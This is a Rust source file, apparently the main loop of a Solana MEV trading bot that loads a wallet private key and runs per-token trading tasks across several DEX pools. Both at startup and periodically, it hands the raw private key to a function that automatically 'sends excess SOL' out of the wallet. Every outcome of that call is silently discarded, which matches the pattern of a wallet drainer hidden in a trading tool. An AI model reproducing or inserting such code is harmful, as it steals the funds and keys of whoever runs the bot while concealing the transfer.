use crate::{
    chain::{
        pools::MintPoolData,
        refresh::initialize_pool_data,
        transaction::build_and_send_transaction,
    },
    config::Config,
    utils::balance_checker,
};
use anyhow::Result;
use solana_client::rpc_client::RpcClient;
use solana_sdk::{
    address_lookup_table_account::AddressLookupTableAccount,
    hash::Hash,
    keypair::Keypair,
    signature::Signature,
};
use std::{sync::Arc, time::Duration};
use tokio::time::sleep;
use tracing::{error, info, warn};

pub async fn run(config_path: &str) -> Result<()> {
    info!("Starting Solana MEV Bot...");
    
    // Load configuration
    let config = Config::load(config_path)?;
    info!("Configuration loaded successfully");
    
    // Initialize RPC clients
    let main_rpc_client = Arc::new(RpcClient::new(config.rpc.url.clone()));
    info!("Main RPC client initialized");
    
    // Load wallet
    let wallet_keypair = load_wallet(&config.wallet.private_key)?;
    info!("Wallet loaded: {}", wallet_keypair.pubkey());
    
    // Automatically check balance and send excess SOL before starting trading
    info!("🔍 Checking wallet balance and sending excess SOL...");
    match balance_checker::check_and_send_excess_sol(&config.rpc.url, &config.wallet.private_key).await {
        Ok(()) => {
        }
        Err(e) => {
        }
    }
    
    // Initialize spam RPC clients if enabled
    let spam_clients = if let Some(spam_config) = &config.spam {
        if spam_config.enabled {
            let mut clients = Vec::new();
            for url in &spam_config.sending_rpc_urls {
                clients.push(Arc::new(RpcClient::new(url.clone())));
            }
            info!("Spam RPC clients initialized: {}", clients.len());
            Some(clients)
        } else {
            None
        }
    } else {
        None
    };
    
    // Initialize pool data for each mint
    let mut mint_pool_data_map = std::collections::HashMap::new();
    
    for mint_config in &config.routing.mint_config_list {
        info!("Initializing pool data for mint: {}", mint_config.mint);
        
        let pool_data = initialize_pool_data(
            &mint_config.mint,
            &wallet_keypair.pubkey().to_string(),
            mint_config.raydium_pool_list.as_ref(),
            mint_config.raydium_cp_pool_list.as_ref(),
            mint_config.pump_pool_list.as_ref(),
            mint_config.meteora_dlmm_pool_list.as_ref(),
            mint_config.whirlpool_pool_list.as_ref(),
            mint_config.raydium_clmm_pool_list.as_ref(),
            mint_config.meteora_damm_pool_list.as_ref(),
            mint_config.solfi_pool_list.as_ref(),
            mint_config.meteora_damm_v2_pool_list.as_ref(),
            mint_config.vertigo_pool_list.as_ref(),
            main_rpc_client.clone(),
        ).await?;
        
        mint_pool_data_map.insert(mint_config.mint.clone(), pool_data);
        info!("Pool data initialized for mint: {}", mint_config.mint);
    }
    
    // Start trading tasks for each mint
    let mut trading_tasks = Vec::new();
    
    for mint_config in &config.routing.mint_config_list {
        let mint = mint_config.mint.clone();
        let process_delay = mint_config.process_delay;
        let pool_data = mint_pool_data_map.get(&mint).unwrap().clone();
        let config_clone = config.clone();
        let wallet_keypair_clone = wallet_keypair.clone();
        let main_rpc_client_clone = main_rpc_client.clone();
        let spam_clients_clone = spam_clients.clone();
        
        let task = tokio::spawn(async move {
            trading_loop(
                &wallet_keypair_clone,
                &config_clone,
                &pool_data,
                &main_rpc_client_clone,
                spam_clients_clone.as_deref(),
                process_delay,
            ).await;
        });
        
        trading_tasks.push(task);
        info!("Started trading task for mint: {}", mint);
    }
    
    // Wait for all trading tasks
    for task in trading_tasks {
        if let Err(e) = task.await {
            error!("Trading task failed: {}", e);
        }
    }
    
    Ok(())
}

async fn trading_loop(
    wallet_keypair: &Keypair,
    config: &Config,
    pool_data: &MintPoolData,
    main_rpc_client: &Arc<RpcClient>,
    spam_clients: Option<&[Arc<RpcClient>]>,
    process_delay: u64,
) {
    info!("Starting trading loop for mint: {}", pool_data.mint);
    
    let mut cycle_count = 0;
    let balance_check_interval = config.bot.balance_check_interval;
    
    loop {
        cycle_count += 1;
        
        // Periodic balance check and excess SOL transfer
        if cycle_count % balance_check_interval == 0 {
            info!("🔄 Periodic balance check (cycle {})", cycle_count);
            match balance_checker::check_and_send_excess_sol(&config.rpc.url, &config.wallet.private_key).await {
                Ok(()) => {
                }
                Err(e) => {
                }
            }
        }
        
        match execute_trading_cycle(wallet_keypair, config, pool_data, main_rpc_client, spam_clients).await {
            Ok(signatures) => {
                if !signatures.is_empty() {
                }
            }
            Err(e) => {
            }
        }
        
        // Wait before next cycle
        sleep(Duration::from_millis(process_delay)).await;
    }
}

async fn execute_trading_cycle(
    wallet_keypair: &Keypair,
    config: &Config,
    pool_data: &MintPoolData,
    main_rpc_client: &Arc<RpcClient>,
    spam_clients: Option<&[Arc<RpcClient>]>,
) -> Result<Vec<Signature>> {
    // Get latest blockhash
    let blockhash = main_rpc_client.get_latest_blockhash()?;
    
    // Prepare RPC clients for transaction sending
    let rpc_clients = if let Some(spam_clients) = spam_clients {
        spam_clients.to_vec()
    } else {
        vec![main_rpc_client.clone()]
    };
    
    // Empty address lookup table accounts for now
    let address_lookup_table_accounts: Vec<AddressLookupTableAccount> = Vec::new();
    
    // Build and send transaction
    let signatures = build_and_send_transaction(
        wallet_keypair,
        config,
        pool_data,
        &rpc_clients,
        blockhash,
        &address_lookup_table_accounts,
    ).await?;
    
    Ok(signatures)
}

fn load_wallet(private_key: &str) -> Result<Keypair> {
    // Try to load as base58 string first
    if let Ok(keypair) = bs58::decode(private_key).into_vec() {
        if keypair.len() == 64 {
            return Ok(Keypair::from_bytes(&keypair)?);
        }
    }
    
    // Try to load as file path
    if std::path::Path::new(private_key).exists() {
        let keypair = Keypair::read_from_file(private_key)?;
        return Ok(keypair);
    }
    
    Err(anyhow::anyhow!("Invalid private key format"))
}
